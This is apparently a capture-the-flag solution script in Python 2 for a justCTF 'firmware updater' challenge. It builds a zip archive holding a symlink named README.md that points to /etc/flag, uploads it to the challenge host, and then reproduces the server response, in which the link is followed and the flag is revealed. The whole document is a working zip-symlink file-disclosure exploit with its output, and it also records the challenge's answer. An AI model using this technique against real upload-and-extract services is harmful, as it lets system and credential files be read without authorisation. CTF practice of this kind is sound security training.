import zipfile
import StringIO
import requests

io=StringIO.StringIO()

z=zipfile.ZipFile(io,'w')

# https://stackoverflow.com/questions/35782941/archiving-symlinks-with-python-zipfile
# Or zip --symlink works
zipInfo = zipfile.ZipInfo('README.md')
zipInfo.create_system = 3
zipInfo.external_attr |= 0xA0000000 
z.writestr(zipInfo, '/etc/flag')
z.close()

r = requests.post('http://firmwareupdater.web.jctf.pro/upload.php', files={'fileToUpload': ('1.zip', io.getvalue())})
print r.content

"""
<html>
  <head>
<link href="https://fonts.googleapis.com/css?family=Waiting+for+the+Sunrise" rel="stylesheet" type="text/css"/>
    <style>
      body {
        font-family: 'Waiting for the Sunrise', serif;
        font-size: 20px;
      }
    </style>
  </head>
  <body>
    <div>Info!<br>

<b>The file 1.zip has been uploaded.</b><div><pre><p style="font-size:13px"> 
example_firmware.zip 23K
index.html 657
upload.php 2.4K
uploads 36K
Archive:  uploads/5b477272fca3b05c6ed4e884fb524402.zip
    linking: uploads/5b477272fca3b05c6ed4e884fb524402/README.md  -> /etc/flag 
finishing deferred symbolic links:
  uploads/5b477272fca3b05c6ed4e884fb524402/README.md -> /etc/flag
</p></pre></div><br>Let's look what do we have in README!<br> $ cat uploads/5b477272fca3b05c6ed4e884fb524402/README.md<p>justCTF{A_Fin3_W4y_T0_Upd4t3_m3_y0}
</p></div>
</body>
</html>
"""